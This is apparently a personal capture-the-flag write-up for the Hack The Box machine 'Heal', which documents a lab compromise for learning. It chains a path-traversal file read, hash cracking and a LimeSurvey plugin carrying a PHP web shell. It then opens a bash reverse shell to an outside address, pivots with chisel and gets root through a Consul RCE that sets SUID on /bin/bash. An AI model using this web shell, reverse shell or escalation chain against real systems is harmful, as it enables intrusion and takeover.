---
title: Heal
draft: false
tags:
  - medium
  - Linux
socialImage: https://www.jr117.com.es/assets/Heal.png
socialDescription: Heal Writeup
---
![[Heal.png]]

Machine: [Link](https://app.hackthebox.com/machines/Heal)

------

# Reconnaissance
## Port Scanning
- Lets get the open ports and service running on each one
```bash
nmap -p- -n -Pn --min-rate 5000 -sS 10.10.11.46
nmap -p22,80 -n -Pn --min-rate 5000 -sCV 10.10.11.46 -oN Tarteted -oX Targeted.xml
```
>[!example]- View
>![[Pasted image 20250405133742.png]]
>![[Pasted image 20250405134206.png]]

>[!info]- xml2html
>Using [[xsltproc]] we can parse xml to html and view the file on web browser
>```bash
>xsltproc Targeted.xml -o Targeted.html
>```
>![[Pasted image 20250405134625.png]]


## Enumeration: Web Page
### Technologies
- Getting used technologies with [[whatweb]] & [[wappanalyzer]]
```bash
whatweb http://heal.htb/
```
>[!example]- View
>![[Pasted image 20250405135019.png]]
>![[Pasted image 20250405135043.png]]

### Crawling
- We can use a proxy like [[caido]] in order to see the web structure and subdomains while we are using the web page
>[!example]- View
>![[Pasted image 20250405145206.png]]

Subdomain: `api.heal.htb`

- so we add him to the  `/etc/hosts`
>[!example]- View
>![[Pasted image 20250405145739.png]]

- now we can use the login form
>[!example]- Result
>![[Pasted image 20250405145808.png]]


## Enumeration 2: Web Page (Logged)
- Lets try to signup
>[!example]- View
>![[Pasted image 20250405161550.png]]
>![[Pasted image 20250405161609.png]]

- looks like know we can: make a resume, take a survey, or check/logout 
>[!example]- View
>Resume:
>![[Pasted image 20250405162038.png]]
>Survey (new subdomain):
>![[Pasted image 20250405162111.png]]
>Profile:
>![[Pasted image 20250405162156.png]]

- checking the profile we can see that we are not marked as admin, researching i found that the authorization token is a JWT (JSON Web Token)
>[!example]- View
>![[Pasted image 20250405163446.png]]

- The resume builder return a PDF with the data parsed
>[!example]- View
>![[Pasted image 20250405164927.png]]

- checking the request using [[caido]] we see this request
>[!example]- View
>![[Pasted image 20250405170055.png]]

## Exploitation: LFI
- The previus request looks like vulnerable to LFI
>[!example]- View
>![[Pasted image 20250405170421.png]]

- Perfect now we have a LFI, lets get the server users: `/download?filename=../../../../../../etc/passwd` (looking this file i think that there are a postgres database running)
Users: `ralph, postgres, ron`

- I notice that `api.heal.htb` endoint have ruby on rails running.
>[!example]- Result
>![[Pasted image 20250405193917.png]]

- that's means that we can read some configuration files
`../../config/database.yml`: SQLite 3.8.0 / database location: (`storage/development.sqlite3`)
>[!example]- View
>![[Pasted image 20250405195720.png]]

`../../config/credentials.yml.enc`: Credentials
>[!example]- View
>![[Pasted image 20250405194512.png]]

`../../config/master.key`: Master key
>[!example]- View
>![[Pasted image 20250405195845.png]]

## Cracking Password (Ralph)
- We found a sqlite3 file so if we dump it we get a hash `../../storage/development.sqlite3`
>[!example]- View
>![[Pasted image 20250405195114.png]]

- As we found a hash for the user ralph, we can try to crack it using [[john the ripper]]
```bash
john ralphHash --wordlist=/usr/share/wordlists/rockyou.txt
```
>[!example]- View
>![[Pasted image 20250405195317.png]]

Credentials: `ralph@heal.htb:147258369`

- Perfect!, now we are admin, lets find the RCE
>[!example]- View
>![[Pasted image 20250405200242.png]]

## Enumeration 3: Web Page (As Admin)
- At the previous points i found a interesting tecnologie behind `take-survey.heal.htb` it using "LimeSurvey" now lets find the login panel
```bash
gobuster dir -u 'http://take-survey.heal.htb/' -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt --add-slash
```
>[!example]- View
>![[Pasted image 20250405201124.png]]
>![[Pasted image 20250405201149.png]]

- We can try to use the found credentials
>[!example]- View
>![[Pasted image 20250405201505.png]]

- We have access and we can check the version
>[!example]- View
>![[Pasted image 20250405201554.png]]

# Initial Access
## Plugin Upload
- we can try to upload a plugin, first we need to check the format that this technology use
>[!example]- View
>![[Pasted image 20250405201742.png]]

- I found that there are 2 essential files (`config.xml`, `index.php`) and they have to be compressed `.zip`
```bash
zip MyPlugin.zip config.xml index.php
```

XML:
```xml
<config>
    <metadata>
        <name>MyPlugin</name>
        <type>plugin</type>
        <creationDate>2025-01-01</creationDate>
        <lastUpdate>2025-01-01</lastUpdate>
        <author>R1nzler</author>
        <authorUrl>https://github.com/Marcejr117</authorUrl>
        <supportUrl>https://github.com/Marcejr117</supportUrl>
        <version>5.0</version>
        <license>GNU General Public License version 2 or later</license>
        <description>
		<![CDATA[Author : R1nzler]]></description>
    </metadata>

    <compatibility>
        <version>3.0</version>
        <version>4.0</version>
        <version>5.0</version>
        <version>6.0</version>
    </compatibility>
    <updaters disabled="disabled"></updaters>
</config>
```

PHP:
```php
<?php if(isset($_REQUEST["cmd"])){ echo "<pre>"; $cmd = ($_REQUEST["cmd"]); system($cmd); echo "</pre>"; die; }?>
```

>[!example]- View
>![[Pasted image 20250405204535.png]]

- Now lets try to upload the plugin
>[!example]- View
>![[Pasted image 20250405204713.png]]
>![[Pasted image 20250405204714.png]]
>![[Pasted image 20250405204745.png]]

## RCE
- Now we have RCE
>[!example]- View
>![[Pasted image 20250405205604.png]]

- Getting the revershell: `http://take-survey.heal.htb/upload/plugins/MyPlugin/index.php?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.16.3%2F4444%200%3E%261%22`
Listener:
```bash
nc -lvnp 4444
```

# Privilege Escalation
## Enumeration 1: (www-data)
- Checking the files of the web service i found the postgres credentials
```bash
find ./ -type f -name "config*" -exec grep -B 3 -A 3 -E "*pass*" {} \;
```
>[!example]- Result
>![[Pasted image 20250405211215.png]]
>![[Pasted image 20250405211815.png]]

Credentials: `host=localhost;port=5432;user=db_user;password=AdmiDi0_pA$$w0rd;dbname=survey;`

- we can connect to postgres using [[psql]]
```bash
psql -h localhost -U db_user -d survey
SELECT * FROM lime_users;
```

- Nothing especial on this database, lets check the open ports
```bash
netstat -nat
```
>[!example]- View
>![[Pasted image 20250405213722.png]]


- lets try to reuse the last password to get authenticated as some user
>[!example]- Result
>![[Pasted image 20250405214204.png]]

Credentials: `ron:AdmiDi0_pA$$w0rd`

## Enumeration 2: (ron)
- As we see before there are some interesting open ports so lets use [[chisel]] to port forwarding
```bash
wget https://github.com/jpillora/chisel/releases/download/v1.7.4/chisel_1.7.4_linux_amd64.gz
gunzip chisel_1.7.4_linux_amd64.gz
chmod +x chisel_1.7.4_linux_amd64
mv chisel_1.7.4_linux_amd64 chisel
```

Attacker:
```bash
./chisel server --reverse --port 1234
```
>[!example]- Result
>![[Pasted image 20250405232827.png]]
>![[Pasted image 20250405233437.png]]

Victim:
```bash
netstat -nat | grep "LISTEN"
./chisel client 10.10.16.3:1234 R:localhost:3000 R:localhost:3001 R:localhost:8500 R:localhost:8503 R:localhost:8600 R:localhost:8300 R:localhost:8301 R:localhost:5432 &
```
>[!example]- Result
>![[Pasted image 20250405232645.png]]

- One of this ports looks quiet interesting
>[!example]- View
>![[Pasted image 20250405235215.png]]
>![[Pasted image 20250405235218.png]]

## Getting Access (Root)
- This version is vulnerable to RCE, because this endpoint allow remote command execution: `/v1/agent/service/register` using the method `PUT`, we can use this [PoC](https://github.com/owalid/consul-rce/blob/main/consul_rce.py) in order to abuse it
```bash
python3 consul_rce.py -th localhost -tp 8500 -c "chmod +s /bin/bash"
```
>[!example]- Result
>![[Pasted image 20250406000649.png]]

